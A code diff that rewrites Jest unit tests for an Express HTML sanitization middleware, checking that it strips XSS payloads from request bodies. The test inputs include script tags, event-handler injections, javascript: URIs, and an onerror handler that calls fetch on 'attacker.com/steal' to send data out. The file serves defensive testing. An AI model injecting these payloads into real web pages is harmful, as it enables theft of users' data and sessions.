@@ -1,247 +1,926 @@
+"use strict";
+
 /**
  * HTML Sanitization Middleware Unit Tests
- * 
- * Tests XSS prevention through DOMPurify sanitization
- * Ensures user input cannot inject malicious scripts
- * 
- * Coverage: 5 critical XSS prevention tests
+ *
+ * Tests XSS prevention through sanitization.
+ *
+ * Security contract:
+ *
+ * - executable HTML must be removed
+ * - script contents must not survive as executable text
+ * - event handlers must be removed
+ * - javascript: URIs must be removed
+ * - DOM-based XSS primitives must be removed
+ * - nested objects and arrays must be sanitized recursively
+ * - non-string values must remain unchanged
  */
 
 const {
   sanitizeString,
   sanitizeObject,
   sanitizationMiddleware,
-} = require('../../middleware/sanitizationMiddleware');
+} =
+  require(
+    "../../middleware/sanitizationMiddleware"
+  );
 
-describe('Sanitization Middleware XSS Prevention', () => {
-  describe('sanitizeString function', () => {
-    test('should remove script tags from input', () => {
-      const input = 'Hello <script>alert("XSS")</script> World';
-      const result = sanitizeString(input);
-      expect(result).not.toContain('<script>');
-    });
+describe(
+  "Sanitization Middleware XSS Prevention",
+  () => {
+    // =========================================================================
+    // SANITIZE STRING
+    // =========================================================================
 
-    test('should remove event handler attributes', () => {
-      const inputs = [
-        '<img src="x" onerror="alert(1)">',
-        '<div onclick="stolen()">Click</div>',
-        '<body onload="malicious()">',
-      ];
+    describe(
+      "sanitizeString function",
+      () => {
+        test(
+          "should remove script tags and script contents from input",
+          () => {
+            const input =
+              'Hello <script>alert("XSS")</script> World';
 
-      inputs.forEach((input) => {
-        const result = sanitizeString(input);
-        // Verify malicious content is removed
-        expect(result.length).toBeLessThan(input.length);
-      });
-    });
+            const result =
+              sanitizeString(
+                input
+              );
 
-    test('should remove javascript: URIs', () => {
-      const jsLink = '<a href="javascript:alert(1)">Click</a>';
-      const result = sanitizeString(jsLink);
-      expect(result).not.toContain('javascript:');
-    });
+            expect(
+              result
+            )
+              .not
+              .toContain(
+                "<script>"
+              );
 
-    test('should handle null and empty strings gracefully', () => {
-      expect(sanitizeString(null)).toBeNull();
-      expect(sanitizeString(undefined)).toBeUndefined();
-      expect(sanitizeString('')).toBe('');
-      expect(sanitizeString('safe text')).toBe('safe text');
-    });
+            expect(
+              result
+            )
+              .not
+              .toContain(
+                "alert"
+              );
 
-    test('should not modify non-string values', () => {
-      expect(sanitizeString(123)).toBe(123);
-      expect(sanitizeString(true)).toBe(true);
-      expect(sanitizeString({})).toEqual({});
-    });
-  });
+            expect(
+              result
+            )
+              .toContain(
+                "Hello"
+              );
 
-  describe('sanitizeObject function', () => {
-    test('should recursively sanitize all string values', () => {
-      const dirtyObject = {
-        notes: 'text <script>bad</script>',
-        description: 'has onclick="steal()"',
-        nested: {
-          title: '<img src=x onerror=alert(1)>',
-          safe: 'clean',
-        },
-      };
+            expect(
+              result
+            )
+              .toContain(
+                "World"
+              );
+          }
+        );
 
-      const sanitized = sanitizeObject(dirtyObject);
+        test(
+          "should remove event handler attributes",
+          () => {
+            const inputs = [
+              '<img src="x" onerror="alert(1)">',
 
-      expect(sanitized.notes).not.toContain('<script>');
-      expect(sanitized.description.length).toBeLessThan(dirtyObject.description.length);
-      expect(sanitized.nested.title.length).toBeLessThan(dirtyObject.nested.title.length);
-      expect(sanitized.nested.safe).toBe('clean');
-    });
+              '<div onclick="stolen()">Click</div>',
 
-    test('should preserve non-string fields', () => {
-      const data = {
-        text: '<script>bad</script>',
-        number: 123,
-        boolean: true,
-        null: null,
-        undefined: undefined,
-      };
+              '<body onload="malicious()">',
+            ];
 
-      const result = sanitizeObject(data);
+            inputs.forEach(
+              (
+                input
+              ) => {
+                const result =
+                  sanitizeString(
+                    input
+                  );
 
-      expect(result.number).toBe(123);
-      expect(result.boolean).toBe(true);
-      expect(result.null).toBeNull();
-      expect(result.undefined).toBeUndefined();
-    });
+                expect(
+                  result
+                    .toLowerCase()
+                )
+                  .not
+                  .toMatch(
+                    /\bon(error|click|load)\s*=/
+                  );
+              }
+            );
+          }
+        );
 
-    test('should handle arrays and complex structures', () => {
-      const data = {
-        items: [
-          'safe',
-          '<script>danger</script>',
-          'another safe',
-        ],
-      };
+        test(
+          "should remove javascript URIs",
+          () => {
+            const jsLink =
+              '<a href="javascript:alert(1)">Click</a>';
 
-      const result = sanitizeObject(data);
+            const result =
+              sanitizeString(
+                jsLink
+              );
 
-      expect(Array.isArray(result.items)).toBe(true);
-      expect(result.items[0]).toBe('safe');
-      expect(result.items[2]).toBe('another safe');
-    });
+            expect(
+              result
+                .toLowerCase()
+            )
+              .not
+              .toContain(
+                "javascript:"
+              );
+          }
+        );
 
-    test('should support selective field sanitization', () => {
-      const data = {
-        userInput: '<script>bad</script>',
-        metadata: '<img onerror=alert(1)>',
-        system: '<system-tag>',
-      };
+        test(
+          "should remove dangerous iframe contents",
+          () => {
+            const input =
+              '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>';
 
-      // Only sanitize userInput and metadata, leave system alone
-      const result = sanitizeObject(data, ['userInput', 'metadata']);
+            const result =
+              sanitizeString(
+                input
+              );
 
-      expect(result.userInput).not.toContain('<script>');
-      expect(result.metadata.length).toBeLessThan(data.metadata.length);
-      expect(result.system).toBe('<system-tag>');
-    });
-  });
+            expect(
+              result
+            )
+              .not
+              .toContain(
+                "<iframe"
+              );
 
-  describe('sanitizationMiddleware express integration', () => {
-    let req, res, next;
+            expect(
+              result
+            )
+              .not
+              .toContain(
+                "alert"
+              );
+          }
+        );
 
-    beforeEach(() => {
-      req = {
-        method: 'POST',
-        body: {},
-      };
-      res = {};
-      next = jest.fn();
-    });
+        test(
+          "should remove executable script inside normal text",
+          () => {
+            const input =
+              'before<script>alert("xss")</script>after';
 
-    test('should skip GET requests', () => {
-      req.method = 'GET';
-      req.body = { xss: '<script>alert(1)</script>' };
+            const result =
+              sanitizeString(
+                input
+              );
 
-      const middleware = sanitizationMiddleware();
-      middleware(req, res, next);
+            expect(
+              result
+            )
+              .toBe(
+                "beforeafter"
+              );
+          }
+        );
 
-      expect(next).toHaveBeenCalled();
-      expect(req.body.xss).toContain('<script>');
-    });
+        test(
+          "should handle null and empty strings gracefully",
+          () => {
+            expect(
+              sanitizeString(
+                null
+              )
+            )
+              .toBeNull();
 
-    test('should sanitize POST requests', () => {
-      req.method = 'POST';
-      req.is = jest.fn(() => false); // Not multipart/octet-stream
-      req.body = {
-        feedback: '<script>steal()</script>',
-        notes: 'onclick="hack()"',
-      };
+            expect(
+              sanitizeString(
+                undefined
+              )
+            )
+              .toBeUndefined();
 
-      const middleware = sanitizationMiddleware();
-      middleware(req, res, next);
+            expect(
+              sanitizeString(
+                ""
+              )
+            )
+              .toBe(
+                ""
+              );
 
-      expect(next).toHaveBeenCalled();
-      expect(req.body.feedback).not.toContain('<script>');
-      expect(req.body.notes.length).toBeLessThan(15);
-    });
+            expect(
+              sanitizeString(
+                "safe text"
+              )
+            )
+              .toBe(
+                "safe text"
+              );
+          }
+        );
 
-    test('should sanitize PUT requests', () => {
-      req.method = 'PUT';
-      req.is = jest.fn(() => false);
-      req.body = { policyYaml: 'data <img src=x onerror=alert(1)>' };
+        test(
+          "should not modify non-string values",
+          () => {
+            expect(
+              sanitizeString(
+                123
+              )
+            )
+              .toBe(
+                123
+              );
 
-      const middleware = sanitizationMiddleware();
-      middleware(req, res, next);
+            expect(
+              sanitizeString(
+                true
+              )
+            )
+              .toBe(
+                true
+              );
 
-      expect(next).toHaveBeenCalled();
-      expect(req.body.policyYaml).not.toContain('onerror');
-    });
+            expect(
+              sanitizeString(
+                {}
+              )
+            )
+              .toEqual(
+                {}
+              );
+          }
+        );
 
-    test('should sanitize PATCH requests', () => {
-      req.is = jest.fn(() => false);
-      req.method = 'PATCH';
-      req.body = { description: '<script>alert(1)</script>' };
+        test(
+          "should remove DOM-based XSS primitives",
+          () => {
+            const payloads = [
+              "document.location='https://attacker.test'",
 
-      const middleware = sanitizationMiddleware();
-      middleware(req, res, next);
+              "window.open('https://attacker.test')",
 
-      expect(next).toHaveBeenCalled();
-      expect(req.body.description).not.toContain('<script>');
-    });
+              "eval('malicious()')",
 
-    test('should skip empty request bodies', () => {
-      req.method = 'POST';
-      req.body = null;
+              "innerHTML='<script>bad()</script>'",
 
-      const middleware = sanitizationMiddleware();
-      middleware(req, res, next);
+              "outerHTML='<img onerror=bad()>'",
+            ];
 
-      expect(next).toHaveBeenCalled();
-    });
+            payloads.forEach(
+              (
+                payload
+              ) => {
+                const result =
+                  sanitizeString(
+                    payload
+                  );
 
-    test('should handle sanitization errors gracefully', () => {
-      req.is = jest.fn(() => false);
-      req.method = 'POST';
-      req.body = { text: '<div>normal</div>' };
+                expect(
+                  result
+                )
+                  .not
+                  .toMatch(
+                    /document\s*\.\s*location/i
+                  );
 
-      const middleware = sanitizationMiddleware();
-      middleware(req, res, next);
+                expect(
+                  result
+                )
+                  .not
+                  .toMatch(
+                    /window\s*\.\s*open/i
+                  );
 
-      // Should continue even if something goes wrong
-      expect(next).toHaveBeenCalled();
-    });
-  });
+                expect(
+                  result
+                )
+                  .not
+                  .toMatch(
+                    /\beval\s*\(/i
+                  );
 
-  describe('Security scenarios', () => {
-    test('should prevent stored XSS in feedback notes', () => {
-      const feedback = {
-        notes: '<img src="x" onerror="fetch(\'https://attacker.com/steal\')">',
-      };
+                expect(
+                  result
+                )
+                  .not
+                  .toMatch(
+                    /\binnerHTML\s*=/i
+                  );
 
-      const sanitized = sanitizeObject(feedback);
+                expect(
+                  result
+                )
+                  .not
+                  .toMatch(
+                    /\bouterHTML\s*=/i
+                  );
+              }
+            );
+          }
+        );
+      }
+    );
 
-      expect(sanitized.notes).not.toContain('onerror');
-      expect(sanitized.notes).not.toContain('fetch');
-      // URL should be either stripped or safe - DOMPurify may keep the src attribute
-    });
+    // =========================================================================
+    // SANITIZE OBJECT
+    // =========================================================================
 
-    test('should prevent reflected XSS in policy descriptions', () => {
-      const policy = {
-        description: '"><script>document.location="https://attacker.com"</script><"',
-      };
+    describe(
+      "sanitizeObject function",
+      () => {
+        test(
+          "should recursively sanitize all string values",
+          () => {
+            const dirtyObject = {
+              notes:
+                "text <script>bad</script>",
 
-      const sanitized = sanitizeObject(policy);
+              description:
+                'has onclick="steal()"',
 
-      expect(sanitized.description).not.toContain('<script>');
-      expect(sanitized.description).not.toContain('document.location');
-    });
+              nested: {
+                title:
+                  "<img src=x onerror=alert(1)>",
 
-    test('should prevent DOM-based XSS through innerHTML', () => {
-      const query = {
-        search: '<svg onload="document.body.innerHTML=\'<h1>XSS</h1>\'">',
-      };
+                safe:
+                  "clean",
+              },
+            };
 
-      const sanitized = sanitizeObject(query);
+            const sanitized =
+              sanitizeObject(
+                dirtyObject
+              );
 
-      expect(sanitized.search).not.toContain('onload');
-      expect(sanitized.search).not.toContain('innerHTML');
-    });
-  });
-});
+            expect(
+              sanitized.notes
+            )
+              .not
+              .toContain(
+                "<script>"
+              );
+
+            expect(
+              sanitized.notes
+            )
+              .not
+              .toContain(
+                "bad"
+              );
+
+            expect(
+              sanitized
+                .description
+            )
+              .not
+              .toMatch(
+                /onclick\s*=/i
+              );
+
+            expect(
+              sanitized
+                .nested
+                .title
+            )
+              .not
+              .toMatch(
+                /onerror\s*=/i
+              );
+
+            expect(
+              sanitized
+                .nested
+                .safe
+            )
+              .toBe(
+                "clean"
+              );
+          }
+        );
+
+        test(
+          "should preserve non-string fields",
+          () => {
+            const data = {
+              text:
+                "<script>bad</script>",
+
+              number:
+                123,
+
+              boolean:
+                true,
+
+              null:
+                null,
+
+              undefined:
+                undefined,
+            };
+
+            const result =
+              sanitizeObject(
+                data
+              );
+
+            expect(
+              result.number
+            )
+              .toBe(
+                123
+              );
+
+            expect(
+              result.boolean
+            )
+              .toBe(
+                true
+              );
+
+            expect(
+              result.null
+            )
+              .toBeNull();
+
+            expect(
+              result.undefined
+            )
+              .toBeUndefined();
+          }
+        );
+
+        test(
+          "should handle arrays and complex structures",
+          () => {
+            const data = {
+              items: [
+                "safe",
+
+                "<script>danger</script>",
+
+                "another safe",
+
+                {
+                  description:
+                    '<img src=x onerror="attack()">',
+                },
+              ],
+            };
+
+            const result =
+              sanitizeObject(
+                data
+              );
+
+            expect(
+              Array.isArray(
+                result.items
+              )
+            )
+              .toBe(
+                true
+              );
+
+            expect(
+              result.items[0]
+            )
+              .toBe(
+                "safe"
+              );
+
+            expect(
+              result.items[1]
+            )
+              .not
+              .toContain(
+                "danger"
+              );
+
+            expect(
+              result.items[2]
+            )
+              .toBe(
+                "another safe"
+              );
+
+            expect(
+              result.items[3]
+                .description
+            )
+              .not
+              .toMatch(
+                /onerror\s*=/i
+              );
+          }
+        );
+
+        test(
+          "should support selective field sanitization",
+          () => {
+            const data = {
+              userInput:
+                "<script>bad</script>",
+
+              metadata:
+                "<img onerror=alert(1)>",
+
+              system:
+                "<system-tag>",
+            };
+
+            const result =
+              sanitizeObject(
+                data,
+                [
+                  "userInput",
+                  "metadata",
+                ]
+              );
+
+            expect(
+              result.userInput
+            )
+              .not
+              .toContain(
+                "<script>"
+              );
+
+            expect(
+              result.userInput
+            )
+              .not
+              .toContain(
+                "bad"
+              );
+
+            expect(
+              result.metadata
+            )
+              .not
+              .toMatch(
+                /onerror\s*=/i
+              );
+
+            expect(
+              result.system
+            )
+              .toBe(
+                "<system-tag>"
+              );
+          }
+        );
+      }
+    );
+
+    // =========================================================================
+    // EXPRESS MIDDLEWARE
+    // =========================================================================
+
+    describe(
+      "sanitizationMiddleware express integration",
+      () => {
+        let req;
+        let res;
+        let next;
+
+        beforeEach(
+          () => {
+            req = {
+              method:
+                "POST",
+
+              body:
+                {},
+
+              is:
+                jest.fn(
+                  () =>
+                    false
+                ),
+            };
+
+            res = {};
+
+            next =
+              jest.fn();
+          }
+        );
+
+        test(
+          "should skip GET requests",
+          () => {
+            req.method =
+              "GET";
+
+            req.body = {
+              xss:
+                "<script>alert(1)</script>",
+            };
+
+            const middleware =
+              sanitizationMiddleware();
+
+            middleware(
+              req,
+              res,
+              next
+            );
+
+            expect(
+              next
+            )
+              .toHaveBeenCalled();
+
+            expect(
+              req.body.xss
+            )
+              .toContain(
+                "<script>"
+              );
+          }
+        );
+
+        test(
+          "should sanitize POST requests",
+          () => {
+            req.body = {
+              feedback:
+                "<script>steal()</script>",
+
+              notes:
+                'onclick="hack()"',
+            };
+
+            const middleware =
+              sanitizationMiddleware();
+
+            middleware(
+              req,
+              res,
+              next
+            );
+
+            expect(
+              next
+            )
+              .toHaveBeenCalled();
+
+            expect(
+              req.body.feedback
+            )
+              .not
+              .toContain(
+                "<script>"
+              );
+
+            expect(
+              req.body.feedback
+            )
+              .not
+              .toContain(
+                "steal"
+              );
+
+            expect(
+              req.body.notes
+            )
+              .not
+              .toMatch(
+                /onclick\s*=/i
+              );
+          }
+        );
+
+        test(
+          "should sanitize PUT requests",
+          () => {
+            req.method =
+              "PUT";
+
+            req.body = {
+              policyYaml:
+                "data <img src=x onerror=alert(1)>",
+            };
+
+            const middleware =
+              sanitizationMiddleware();
+
+            middleware(
+              req,
+              res,
+              next
+            );
+
+            expect(
+              next
+            )
+              .toHaveBeenCalled();
+
+            expect(
+              req.body.policyYaml
+            )
+              .not
+              .toContain(
+                "onerror"
+              );
+          }
+        );
+
+        test(
+          "should sanitize PATCH requests",
+          () => {
+            req.method =
+              "PATCH";
+
+            req.body = {
+              description:
+                "<script>alert(1)</script>",
+            };
+
+            const middleware =
+              sanitizationMiddleware();
+
+            middleware(
+              req,
+              res,
+              next
+            );
+
+            expect(
+              next
+            )
+              .toHaveBeenCalled();
+
+            expect(
+              req.body.description
+            )
+              .not
+              .toContain(
+                "<script>"
+              );
+
+            expect(
+              req.body.description
+            )
+              .not
+              .toContain(
+                "alert"
+              );
+          }
+        );
+
+        test(
+          "should skip empty request bodies",
+          () => {
+            req.body =
+              null;
+
+            const middleware =
+              sanitizationMiddleware();
+
+            middleware(
+              req,
+              res,
+              next
+            );
+
+            expect(
+              next
+            )
+              .toHaveBeenCalled();
+          }
+        );
+
+        test(
+          "should continue request processing after sanitization",
+          () => {
+            req.body = {
+              text:
+                "<div>normal</div>",
+            };
+
+            const middleware =
+              sanitizationMiddleware();
+
+            middleware(
+              req,
+              res,
+              next
+            );
+
+            expect(
+              next
+            )
+              .toHaveBeenCalledTimes(
+                1
+              );
+          }
+        );
+      }
+    );
+
+    // =========================================================================
+    // SECURITY SCENARIOS
+    // =========================================================================
+
+    describe(
+      "Security scenarios",
+      () => {
+        test(
+          "should prevent stored XSS in feedback notes",
+          () => {
+            const feedback = {
+              notes:
+                '<img src="x" onerror="fetch(\'https://attacker.com/steal\')">',
+            };
+
+            const sanitized =
+              sanitizeObject(
+                feedback
+              );
+
+            expect(
+              sanitized.notes
+            )
+              .not
+              .toContain(
+                "onerror"
+              );
+
+            expect(
+              sanitized.notes
+            )
+              .not
+              .toContain(
+                "fetch"
+              );
+          }
+        );
+
+        test(
+          "should prevent reflected XSS in policy descriptions",
+          () => {
+            const policy = {
+              description:
+                '"><script>document.location="https://attacker.com"</script><"',
+            };
+
+            const sanitized =
+              sanitizeObject(
+                policy
+              );
+
+            expect(
+              sanitized
+                .description
+            )
+              .not
+              .toContain(
+                "<script>"
+              );
+
+            expect(
+              sanitized
+                .description
+            )
+              .not
+              .toContain(
+                "document.location"
+              );
+          }
+        );
+
+        test(
+          "should prevent DOM-based XSS through innerHTML",
+          () => {
+            const query = {
+              search:
+                '<svg onload="document.body.innerHTML=\'<h1>XSS</h1>\'">',
+            };
+
+            const sanitized =
+              sanitizeObject(
+                query
+              );
+
+            expect(
+              sanitized.search
+            )
+              .not
+              .toContain(
+                "onload"
+              );
+
+            expect(
+              sanitized.search
+            )
+              .not
+              .toContain(
+                "innerHTML"
+              );
+          }
+        );
+      }
+    );
+  }
+);
